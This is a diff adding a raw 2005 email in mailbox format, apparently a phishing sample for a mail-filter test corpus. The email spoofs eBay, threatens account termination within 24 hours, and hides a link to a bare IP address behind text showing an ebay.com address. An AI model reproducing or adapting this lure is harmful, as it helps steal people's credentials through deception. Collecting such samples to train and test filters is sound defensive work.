@@ -1,0 +1,92 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 937262A88C
+ for <user@example.com>; Thu,  3 Nov 2005 16:42:38 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 894B8621C92; Thu,  3 Nov 2005 16:42:38 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 51E7A621C78
+ for <user@example.com>; Thu,  3 Nov 2005 16:42:38 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id QAA00034
+ for user@example.com; Thu, 3 Nov 2005 16:42:38 -0500
+Received: from cpe-69-207-226-121.maine.res.rr.com
+ (cpe-69-207-226-121.maine.res.rr.com [69.207.226.121])
+ by mail.example.com with SMTP id QAA00026
+ for <user@biochemistry.bioc.cwru.edu>; Thu, 3 Nov 2005 16:42:37 -0500
+Received: from 69.207.226.121 (52.28.199.236)
+ by mail.kimtalbert.com (FirstClass Mail Server v7.1) with SMTP
+ (Sender: aw-confirm@ebay.com)
+ transient id 3S[4]; Thu, 03 Nov 2005 23:40:39 +0200
+Message-ID: <6UUSQgatznaU137x@kimtalbert.com>
+From: "aw-confirm@ebay.com" <aw-confirm@eBay.com>
+To: user@biochemistry.bioc.cwru.edu
+Subject: Please Verify Your eBay Identity
+Date: Fri, 04 Nov 2005 03:41:39 +0600
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--631-0486-6320"
+Content-Length: 2488
+Lines: 55
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 226
+
+----631-0486-6320
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<img border="0" src="http://pics.ebaystatic.com/aw/pics/navbar/redesign_p1/ebayLogo.gif" width="150" height="70"><p>
+<body bgcolor=#ffffff></p>
+<div align="left">
+<TABLE width=520 cellpadding=0 cellspacing=0 bgcolor=#ffffff class=main>
+<TR><TD align="left">
+<P align="left"><font face="Times New Roman">Dear eBay ® User,</font><P align="left">
+<font face="Times New Roman">Dear valued eBay member, 
+
+It has come to our attention that your eBay Billing Information
+records are out of date. That requires you to update the Billing Information.
+</font>
+<P align="left"><font face="Times New Roman">However, failure to do so will result in account termination. Please update your records in 
+maximum 24 hours. Once you have updated your account records, your eBay session 
+will not be interrupted and will continue as normal. </font>
+<P align="left"><font face="Times New Roman">Please click the secure link below to update your billing records.
+</font>
+<P align="left"><font face="Times New Roman">
+<a href="http://61.66.133.174/ebay/login/">https://ebay.com/awcgi/eBayISAPI.dll/%ebay.verify/support</a></font><p style="margin-top: 0; margin-bottom: 0" align="left">
+&nbsp;</p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">
+<font face="Times New Roman">Thank you,</font></p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">
+<font face="Times New Roman">eBay Accounts Management</font></p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">&nbsp;</p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">
+---------------------------------------------</p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">Thank you for using 
+eBay!</p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">
+---------------------------------------------</p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">Do not reply to this 
+email.</p>
+<p style="margin-top: 0; margin-bottom: 0" align="left">&nbsp;</p>
+</TD></TR>
+</TABLE>
+</div>
+</body>
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+            <tr>
+               <td valign="top" width="100%" align="left">
+				<p align="center">
+				<FONT size=2 face="Trebuchet MS">Copyright © 
+      1995-2004 eBay Inc. All Rights Reserved.</FONT></td>
+               <td valign=top class=footer align=right width="1%">
+				<br>
+                  <br>
+              </td>
+            </tr>
+         </table>
+
+----631-0486-6320--
